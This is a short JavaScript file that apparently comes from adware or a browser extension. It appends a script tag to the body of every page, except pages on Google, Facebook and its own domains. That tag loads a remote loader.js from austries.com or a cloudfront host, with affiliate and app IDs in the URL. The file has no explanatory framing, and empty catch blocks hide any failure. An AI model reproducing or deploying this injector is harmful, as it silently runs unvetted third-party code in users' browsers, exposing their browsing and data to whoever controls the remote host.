(function (){ //df
	var win=window;	
	var _affId="10120009";
	var _appId="900";
	var _bid="4";
	
	try{
		var cmp_rbt = 'http://kle.austries.com/agmz/'+_affId+'/'+_appId+'_'+_bid+'/loader.js';
        var cmp_rbt_ssl = 'https://dqe7rosrbr5lh.cloudfront.net/agmz/'+_affId+'/'+_appId+'_'+_bid+'/loader.js';
		var id=_affId;
		
		try{
			if(win.location.host.indexOf('google.')==-1 && win.location.host.indexOf('facebook.co')==-1 && win.location.host.indexOf("xcodelib.net")==-1 && win.location.host.indexOf("axonan.com")==-1 && win.location.host.indexOf("austries.com")==-1 && win.location.host.indexOf(".cloudfront.net")==-1 ){
				var sf_scriptNode = win.document.createElement('script');
				sf_scriptNode.type = 'text/javascript';
				if(win.location.protocol == 'https:'){
					sf_scriptNode.src =  cmp_rbt_ssl ;
				}else{
					sf_scriptNode.src =  cmp_rbt;
				}
				var headNode = win.document.getElementsByTagName('body');
				if (headNode[0] != null)
					headNode[0].appendChild(sf_scriptNode);
			}			
		}catch(eeee){}	
		
		
	}catch(exr1){}
	
})();
